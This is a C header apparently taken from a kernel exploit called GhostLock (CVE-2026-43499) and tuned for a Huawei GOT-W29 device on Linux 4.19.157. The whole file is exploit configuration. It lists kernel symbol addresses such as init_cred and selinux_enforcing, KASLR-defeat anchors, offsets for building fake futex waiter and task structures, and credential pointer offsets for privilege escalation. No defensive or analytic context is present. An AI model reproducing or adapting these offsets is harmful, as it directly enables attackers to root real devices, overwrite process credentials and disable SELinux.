/* GhostLock (CVE-2026-43499) target for GOT-W29, kernel 4.19.157-perf+
 * ALL offsets measured from boot.elf disassembly (workflow-verified).
 * Device: Huawei GOT-W29, SoC qcom/kona (SM8250), HarmonyOS 4.0/4.2.
 */
#ifndef TARGET_H
#define TARGET_H

/* target profile */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL      /* link-time _text */
#define P0_PAGE_OFFSET 0xffffffc000000000ULL        /* 4.19 linear-map base (VA_BITS=39) */
#define P0_PHYS_OFFSET 0x80000000ULL                /* kona memstart_addr (DRAM base) */
#define P0_KERNEL_PHYS_LOAD 0x80008000ULL           /* PHYS_OFFSET + TEXT_OFFSET(0x80000) */
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define PSELECT_WAITER_WORD_SHIFT 12                /* measured frame delta (E-0x210 vs E-0x1b0) */

/* kernel image addresses (link-time, from kallsyms) */
#define INIT_TASK 0xffffff800b41e100ULL
#define INIT_CRED 0xffffff800b42e9c0ULL
#define ENTRY_TASK 0xffffff800af4b070ULL
#define PER_CPU_OFFSET 0xffffff800b40e368ULL
#define ROOT_TASK_GROUP 0xffffff800b756d80ULL
#define SELINUX_ENFORCING 0xffffff800c3b3000ULL

/* dynamic phys anchors */
#define MEMSTART_ADDR_RVA 0x2bd7910
#define KIMAGE_VOFFSET_RVA 0x2bd7920
#define MEMSTART_ADDR_IMAGE 0xffffff800ac57910ULL
#define KIMAGE_VOFFSET_IMAGE 0xffffff800ac57920ULL

/* KASLR anchors */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff800b4123f0ULL
#define SLIDE_NF_LOGGERS_IMAGE 0xffffff800b412318ULL    /* loggers[NFPROTO][NF_LOG_TYPE_MAX] */
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff800b412320ULL   /* loggers + 1*8 = &loggers[0][1] */
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff800b1f8300ULL  /* &boot_id_ctl_table.data (redirect target) */
#define SLIDE_INIT_TASK_IMAGE 0xffffff800b41e100ULL
#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffff800b756d80ULL

/* waiter fields (4.19 + CONFIG_HW_FUTEX_PI, sizeof=0x58 / 11 words) */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_MAJOR_PRIO_OFF 0x40   /* CONFIG_HW_FUTEX_PI */
#define WAITER_MAJOR_ONLY_OFF 0x44   /* CONFIG_HW_FUTEX_PI */
#define WAITER_PRIO_OFF 0x48
#define WAITER_DEADLINE_OFF 0x50

/* fake waiter */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38

/* fake task fields (MEASURED on 4.19.157) */
#define FAKE_TASK_USAGE_OFF 0x68        /* atomic_t usage (not 0x40) */
#define FAKE_TASK_PRIO_OFF 0x184        /* prio */
#define FAKE_TASK_NORMAL_PRIO_OFF 0x18c /* normal_prio */
#define FAKE_TASK_TASK_GROUP_OFF 0x548  /* sched_task_group (not 0x310) */
#define FAKE_TASK_PI_LOCK_OFF 0xa6c
#define FAKE_TASK_PI_WAITERS_OFF 0xa78
#define FAKE_TASK_PI_TOP_TASK_OFF 0xa88
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa90
/* NOTE: CONFIG_UCLAMP_TASK=n => NO uclamp_req/uclamp fields on 4.19.
   GhostLock leak primitives that used them MUST be replaced. */
/* #define FAKE_TASK_UCLAMP_REQ_OFF  (absent) */
/* #define FAKE_TASK_UCLAMP_OFF     (absent) */

/* task credential pointers (MEASURED: commit_creds) */
#define TASK_REAL_CRED_OFF 0x980
#define TASK_CRED_OFF 0x988

/* misc */
#define MM_STRUCT_SZ 0x3a8   /* boot.elf proc_caches_init kmem_cache_create_usercopy("mm_struct") */

#endif
